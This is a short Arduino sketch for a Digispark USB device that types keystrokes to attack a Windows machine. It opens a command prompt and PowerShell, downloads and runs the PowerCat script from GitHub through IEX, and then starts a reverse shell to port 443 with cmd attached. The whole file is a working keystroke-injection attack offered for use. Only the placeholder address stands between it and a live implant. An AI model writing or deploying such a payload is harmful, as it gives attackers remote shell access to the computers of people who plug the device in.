#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  //init
  DigiKeyboard.sendKeyStroke(0);

  //Open CMD
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);

  //Open Powershell
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(1000);

  //Download PowerCat
  DigiKeyboard.println("IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')");
  DigiKeyboard.delay(5000);

  //Connect
  DigiKeyboard.println("powercat -c 127.0.0.1 -p 443 -e cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(50000000);
}
